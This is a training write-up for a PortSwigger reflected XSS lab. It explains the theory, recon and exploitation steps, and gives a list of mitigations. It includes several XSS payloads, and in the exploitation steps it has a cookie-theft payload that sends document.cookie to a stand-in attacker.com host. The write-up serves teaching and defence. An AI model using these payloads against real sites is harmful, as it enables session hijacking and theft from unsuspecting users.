# Reflected XSS - HTML Context (Nothing Encoded)

## Lab Link
https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded

## Difficulty
Apprentice

## Vulnerability Type
Cross-Site Scripting (XSS) - Reflected

## Theory
Reflected XSS occurs when user input is immediately returned in the HTTP response without proper sanitization or encoding. When user input appears in HTML context with no encoding, JavaScript code injected by attacker will be executed by the victim's browser.

Example vulnerable code:
```php
$search = $_GET['search'];
echo "<h1>Search results for: " . $search . "</h1>";
```

An attacker can inject: `<script>alert('XSS')</script>` directly into the search parameter.

## Recon Process
1. Identify input fields that reflect user input (search, comments, etc.)
2. Test basic HTML injection: `<h1>test</h1>`
3. Observe if tags are rendered as HTML or escaped
4. If rendered, test JavaScript execution with `<script>alert('XSS')</script>`
5. Confirm XSS vulnerability if alert box appears

## Exploitation Steps

### Step 1: Identify Vulnerable Parameter
- Navigate to search functionality
- Enter test input in search field
- Observe how input is reflected in HTML response
- Note if HTML tags are preserved without encoding

### Step 2: Test XSS Payload
- Search for: `<img src=x onerror=alert('XSS')>`
- Observe if alert appears (confirms XSS)
- Common payloads:
  - `<script>alert(document.domain)</script>`
  - `<img src=x onerror="alert('XSS')">`
  - `<svg onload=alert('XSS')>`

### Step 3: Demonstrate Impact
Create a working exploit showing:
- Alert box execution
- Cookie theft: `<img src=x onerror="new Image().src='http://attacker.com/steal.php?c='+document.cookie">`
- Session hijacking capability

### Step 4: Complete Lab
- Submit XSS payload
- Lab validates successful JavaScript execution
- Lab marked as solved

## Root Cause
The application:
1. Accepts user input from URL parameters
2. Directly embeds input into HTML response without encoding
3. Does not use HTML entity encoding (e.g., `&lt;`, `&gt;`, `&quot;`)
4. Does not implement Content Security Policy (CSP)
5. Does not validate input format or whitelist allowed characters

## Impact
- **Session Hijacking:** Stealing session cookies to impersonate users
- **Credential Theft:** Creating fake login forms to capture passwords
- **Malware Distribution:** Redirecting users to malicious sites
- **Defacement:** Modifying page content visible to users
- **Phishing:** Displaying fake content to trick users
- **Keylogging:** Capturing user keystrokes

## Mitigations

### 1. **HTML Entity Encoding (Primary Defense)**
```php
// Encode user input before displaying in HTML context
$search = htmlspecialchars($_GET['search'], ENT_QUOTES, 'UTF-8');
echo "<h1>Search results for: " . $search . "</h1>";
```

### 2. **Context-Aware Encoding**
- HTML context: Use `htmlspecialchars()` or equivalent
- JavaScript context: Use `json_encode()` or escape special chars
- URL context: Use `urlencode()`
- CSS context: Use CSS-safe escaping

### 3. **Content Security Policy (CSP)**
```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'">
```
Prevent inline script execution and restrict script sources.

### 4. **Input Validation**
- Validate input format strictly
- Whitelist allowed characters
- Reject suspicious patterns (script tags, event handlers)

### 5. **Use Security Libraries**
- Python: `markupsafe.escape()`
- Java: `OWASP ESAPI`
- Node.js: `DOMPurify`, `xss` library

### 6. **HTTP Headers**
- `X-XSS-Protection: 1; mode=block` (legacy, still helpful)
- `X-Content-Type-Options: nosniff` (prevent MIME type sniffing)

### 7. **Template Engines**
- Use template engines with auto-escaping enabled
- Example: Jinja2, Handlebars with escaping by default

## Key Takeaway
Always encode/escape user input based on the context where it's used. This simple rule prevents the vast majority of XSS vulnerabilities.
